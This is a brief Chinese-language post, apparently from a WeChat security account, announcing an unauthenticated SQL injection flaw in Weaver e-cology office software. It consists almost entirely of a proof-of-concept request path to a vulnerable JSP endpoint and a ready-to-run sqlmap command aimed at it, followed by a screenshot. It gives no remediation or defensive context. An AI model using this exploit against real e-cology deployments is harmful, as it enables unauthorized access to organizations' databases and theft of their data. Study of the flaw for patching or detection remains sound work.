#  25年6月最新-泛微e-cology 未授权SQL注入漏洞  
 天黑说嘿话   2025-06-27 08:02  
  
#### poc  
```
/js/hrm/getdata.jsp?cmd=savect&arg0=1

```  
  
直接sqlmap  
```
python3 .\sqlmap.py -u "http://xxx/js/hrm/getdata.jsp?cmd=savect&arg0=1" --batch

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/L0IIaicwUY9rtyKYXkjYQwREsvQNvyySIWMm7crrkkGJJrmqDGB8HVe2YcC2apbr0vdfdxf8lxRRjr12r5kliaPQ/640?wx_fmt=png&from=appmsg "")  
  
  
